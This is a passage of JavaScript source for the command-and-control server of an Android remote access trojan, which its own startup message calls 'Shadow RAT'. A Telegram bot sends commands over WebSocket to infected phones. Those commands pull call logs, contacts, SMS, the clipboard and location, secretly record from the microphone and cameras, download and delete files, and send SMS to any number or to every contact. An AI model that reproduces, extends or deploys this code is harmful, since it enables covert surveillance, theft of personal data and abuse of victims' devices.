            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
        const audioLink = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`play_audio:${audioLink}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
}

// ============================================
// CALLBACK QUERIES
// ============================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];
    const chatId = msg.chat.id;

    console.log(`Command: ${commend}, UUID: ${uuid}`);

    if (commend == 'device') {
        const device = appClients.get(uuid);
        const model = device ? device.model : 'Unknown';

        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${model}</b>`, {
            width: 10000,
            chat_id: chatId,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '𝘼𝙥𝙥𝙨', callback_data: `apps:${uuid}` },
                        { text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` }
                    ],
                    [
                        { text: '𝙂𝙚𝙩 𝙛𝙞𝙡𝙚', callback_data: `file:${uuid}` },
                        { text: '𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚', callback_data: `delete_file:${uuid}` }
                    ],
                    [
                        { text: '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙', callback_data: `clipboard:${uuid}` },
                        { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` },
                    ],
                    [
                        { text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` },
                        { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` }
                    ],
                    [
                        { text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `location:${uuid}` },
                        { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` }
                    ],
                    [
                        { text: '𝘾𝙖𝙡𝙡𝙨', callback_data: `calls:${uuid}` },
                        { text: '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `contacts:${uuid}` }
                    ],
                    [
                        { text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` },
                        { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` }
                    ],
                    [
                        { text: '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨', callback_data: `messages:${uuid}` },
                        { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` }
                    ],
                    [
                        { text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` },
                        { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` },
                    ],
                    [
                        {
                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
    }
    else if (commend == 'calls') {
        executeCommand(uuid, 'calls', chatId);
    }
    else if (commend == 'contacts') {
        executeCommand(uuid, 'contacts', chatId);
    }
    else if (commend == 'messages') {
        executeCommand(uuid, 'messages', chatId);
    }
    else if (commend == 'apps') {
        executeCommand(uuid, 'apps', chatId);
    }
    else if (commend == 'device_info') {
        executeCommand(uuid, 'device_info', chatId);
    }
    else if (commend == 'clipboard') {
        executeCommand(uuid, 'clipboard', chatId);
    }
    else if (commend == 'camera_main') {
        executeCommand(uuid, 'camera_main', chatId);
    }
    else if (commend == 'camera_selfie') {
        executeCommand(uuid, 'camera_selfie', chatId);
    }
    else if (commend == 'location') {
        executeCommand(uuid, 'location', chatId);
    }
    else if (commend == 'vibrate') {
        executeCommand(uuid, 'vibrate', chatId);
    }
    else if (commend == 'stop_audio') {
        executeCommand(uuid, 'stop_audio', chatId);
    }
    else if (commend == 'send_message') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ +91xxxxxxxxxx',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'send_message_to_all') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'file') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ\n\n' +
            '/DCIM/Camera/ ᴏʀ /DCIM/Screenshots/',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'delete_file') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ\n\n' +
            '/DCIM/Camera/ ᴏʀ /DCIM/Screenshots/',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'microphone') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'camera_main') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'camera_selfie') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'toast') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'show_notification') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (commend == 'play_audio') {
        currentUuid = uuid;
        appBot.sendMessage(chatId,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮',
            { reply_markup: { force_reply: true } }
        );
    }
});

function executeCommand(uuid, command, chatId) {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send(command);
        }
    });
    currentUuid = uuid;
    appBot.sendMessage(chatId,
        '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
        '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
        {
            parse_mode: "HTML",
            "reply_markup": {
                "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                'resize_keyboard': true
            }
        }
    );
}

// ============================================
// START SERVER
// ============================================
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Shadow RAT Server running on port ${PORT}`);
    console.log(`🤖 Bot token: ${token.substring(0, 10)}...`);
    console.log(`💬 Chat ID: ${id}`);
    console.log(`📊 Web Panel: http://localhost:${PORT}`);
});
